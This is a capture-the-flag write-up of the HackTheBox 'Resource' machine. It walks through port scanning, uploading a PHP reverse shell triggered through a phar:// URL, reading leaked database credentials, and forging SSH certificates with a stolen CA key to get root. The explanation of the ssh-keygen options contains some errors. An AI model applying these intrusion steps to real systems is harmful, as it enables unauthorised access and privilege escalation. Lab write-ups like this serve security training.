---
title: "HTB: Resource Seasonal Machine"
author: "v3l1d"
date: "2024-08-20"
---


![](attachment/3bd70dd5104068e4031e06ac1c61711d.png)

**Port Scan**

```shell
┌──(kali㉿kali)-[~/HTB/Resource]
└─$ cat scan_Complete 
# Nmap 7.94SVN scan initiated Sun Aug 11 14:52:16 2024 as: nmap -sC -sV -A -T4 -Pn -p- -o scan_Complete 10.10.11.27
Nmap scan report for 10.10.11.27
Host is up (0.086s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 d5:4f:62:39:7b:d2:22:f0:a8:8a:d9:90:35:60:56:88 (ECDSA)
|_  256 fb:67:b0:60:52:f2:12:7e:6c:13:fb:75:f2:bb:1a:ca (ED25519)
2222/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f2:a6:83:b9:90:6b:6c:54:32:22:ec:af:17:04:bd:16 (ECDSA)
|_  256 0c:c3:9c:10:f5:7f:d3:e4:a8:28:6a:51:ad:1a:e1:bf (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Aug 11 14:52:32 2024 -- 1 IP address (1 host up) scanned in 15.74 seconds
```

Visit http://itrc.ssg.htb/ 



![](attachment/712ccf9b98e3eb82338f1bcde7b3513e.png)

On this page you can open a ticket uploading a zip file containing a reverse shell script in php. You can exploit phar deserialization to handle the shell generated on revshell generator:

![](attachment/f1f2f21551a2817bed9305cd5d124173.png)

![](attachment/c85cade67bf78fd22ea7ffe4c4886d54.png)


Upload the file on ticket system and open up its page:

![](attachment/f50a4431998e612de3034ff616a90414.png)

```shell
http://itrc.ssg.htb/?page=phar://uploads/0d327960dcada2c40fb3b5c0cc99154b3963ecd4.zip/<phpfilename>
without php extension
```

```shell
$ cd /var/www
$ ls
html
itrc
$ cd itrc
$ ls
admin.php
api
assets
create_ticket.php
dashboard.php
db.php
filter.inc.php
footer.inc.php
header.inc.php
home.php
index.php
loggedin.php
login.php
logout.php
register.php
savefile.inc.php
ticket.php
ticket_section.inc.php
uploads
$ cat db.php    
<?php
$dsn = "mysql:host=db;dbname=resourcecenter;";
$dbusername = "jj";
$dbpassword = "ugEG5********";
$pdo = new PDO($dsn, $dbusername, $dbpassword);

try {
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("Connection failed: " . $e->getMessage());
}$ 

```

Credentials found here didn't work neither for ssh or others.
This box looks always broken so i decided to look a writeup and found out that should be present a file in /uploads folder of itrc that i don't have:

![](attachment/836cab1aee6922d645e447bf11a51d46.png)

```shell
Credentials:
msainristil:82********
```

![](attachment/334f5c9284c02ea18b054c4959331e94.png)

In the decommisions_old_ca folder there is priv/pub key pair, that we are going to convert into ssh keys.

```shell
ssh-keygen -t rsa -b 2048 -f keypair
ssh-keygen -s ca-itrc -n zzinter -I kali keypair.pub 
```


![](attachment/865cfe3a7e89dbf3d5425f2b30dc78e3.png)

When i was www-data i noted that was a port listening on 127.0.0.11, this usuaylly means that we are in adocker container, so trough linpeas i  had a tip about this. Then i used deepce and got:

![](attachment/c3bd47cec612c42278a478ca983b2cd1.png)

RABBIT HOLE, try hard on SSH: https://shivamaharjan.medium.com/ssh-cas-and-principals-630a433d76d6

```shell
ssh-keygen -t ecdsa -C "The CA" -N "" -f root_key
ssh-keygen -s ./ca-itrc -I CA-signing -n msainristil,zzinter,root -V +1w -z 1 ./root_key.pub

Copy with scp generated files and:

──(kali㉿kali)-[~/HTB/Resource]
└─$ ssh -o CertificateFile=root_key-cert.pub -i root_key root@10.10.11.27            
Linux itrc 5.15.0-117-generic #127-Ubuntu SMP Fri Jul 5 20:13:28 UTC 2024 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@itrc:~# ls
```

Even if we logged as root, there's no root flag, so download **sign_key_api.sh** file.

![](attachment/922daa0e3bdaddd8a0a3093c42c89b9f.png)

![](attachment/09598aa1ce18ac9b5f233eecf3a06a09.png)

From zzinter ssh scp this file: **sign_key_api.sh** and modify the file with vim appending **zzinter_temp** and **root_user** as are present in ssh_principals of the box. This is visible generating a public cert for support@ssg.

![](attachment/f1ae315604077afbaba6cfce52ee1e7c.png)

Now sign the private key we obtained with the script, generating a certificate signed 

```shell
┌──(kali㉿kali)-[~/HTB/Resource/zzinter_keys]
└─$ ./sign_key_api.sh keypair.pub zzinter zzinter_temp > zzinter.cert
```

From a writeup (i needed help) i recover this key that we will use a certificate to generate root ssh-key. Pasted it in root_ssh.cert file
```shell
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW 
.......
-----END OPENSSH PRIVATE KEY-----
```

Then login as root on your kali and sign a the private key using this certificate i provided

```shell
┌──(root㉿kali)-[/home/kali/HTB/Resource/zzinter_keys]
└─# ssh-keygen -s root_ssh.cert -z 1 -I root -V -1W:forever -n root_user keypair.pub
Signed user key keypair-cert.pub: id "root" serial 1 for root_user valid after 2024-08-13T13:24:56
┌──(root㉿kali)-[/home/kali/HTB/Resource/zzinter_keys]
└─# ssh-keygen -f keypair-cert.pub -e > root_keypair
┌──(root㉿kali)-[/home/kali/HTB/Resource/zzinter_keys]
└─# ssh -o CertificateFile=keypair-cert.pub -i keypair root@10.10.11.27 -p 2222

```

```shell
ssh-keygen -s root_ssh.cert -z 1 -I root -V -1W:forever -n root_user keypair //Extract the pub key from private // OR
ssh-keygen -s root_ssh.cert -z 1 -I root -V -1W:forever -n root_user keypair.pub //Use Directly the pub key
```

This command generates a signed SSH user certificate using the `ssh-keygen` tool. Here's what each option does:

- -s root_ssh.cert`: specifies the CA certificate file to use for signing (not shown in the output, but assumed to exist).
- -z 1`: specifies the serial number of the certificate (in this case, 1).
- `-I root`: specifies the principal identity of the certificate (in this case, "root").
- `-V -1W:forever`: specifies the validity period of the certificate (in this case, forever, starting from the current time).
- `-n root_user`: specifies the username of the certificate (in this case, "root_user").
- `keypair.pub`: specifies the output file for the generated public key.

The resulting certificate is stored in `keypair-cert.pub`.

**Flags**

![](attachment/d9314cee50c28c2118e10e586b1ea6b8.png)

```shell
user: 98a79086fe4621************
root: 495f767f17cf87************
```
